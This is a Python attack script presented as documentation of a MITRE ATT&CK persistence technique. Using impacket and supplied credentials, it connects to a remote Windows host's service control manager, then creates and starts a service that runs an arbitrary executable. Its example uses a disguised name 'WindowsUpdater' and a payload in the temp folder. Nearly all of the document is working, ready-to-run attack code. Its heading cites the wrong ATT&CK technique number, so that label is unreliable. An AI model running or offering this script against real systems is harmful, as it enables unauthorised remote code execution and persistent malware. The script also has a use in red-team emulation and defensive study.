# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1505 - Persistence: Server Software Component
# Objective: Install a new service for persistence. This script creates and starts a new Windows service pointing to a malicious executable.

#!/usr/bin/env python3
import sys
from impacket.dcerpc.v5 import transport, svcctl
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE

def install_service(target, username, password, domain, service_name, display_name, command):
    try:
        print(f"[*] Attempting to install service '{service_name}' on {target}...")
        string_binding = r'ncacn_np:%s[\pipe\svcctl]' % target
        rpctransport = transport.DCERPCTransportFactory(string_binding)
        
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username, password, domain)
        
        dce = rpctransport.get_dce_rpc()
        dce.set_auth_level(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.connect()
        dce.bind(svcctl.MSRPC_UUID_SVCCTL)

        # Open service control manager
        resp = svcctl.hROpenSCManagerW(dce)
        scm_handle = resp['lpScHandle']

        # Create the service
        print(f"[*] Creating service with command: {command}")
        resp = svcctl.hRCreateServiceW(dce, scm_handle, service_name, display_name,
                                       svcctl.SERVICE_ACCESS_ALL, svcctl.SERVICE_WIN32_OWN_PROCESS,
                                       svcctl.SERVICE_DEMAND_START, svcctl.SERVICE_ERROR_NORMAL, command)
        service_handle = resp['lpServiceHandle']
        print(f"[+] Service '{service_name}' created successfully.")

        # Start the service
        print(f"[*] Starting service '{service_name}'...")
        svcctl.hRStartServiceW(dce, service_handle)
        print(f"[+] Service '{service_name}' started successfully.")

        dce.disconnect()
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == '__main__':
    if len(sys.argv) != 7:
        print("Usage: ./t1505_install_service.py <target> <username> <password> <domain> <service_name> <command>")
        print("Example: ./t1505_install_service.py 192.168.1.100 user pass CORP 'WindowsUpdater' 'C:\\windows\\temp\\payload.exe'")
        sys.exit(1)
    
    install_service(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[5], sys.argv[6])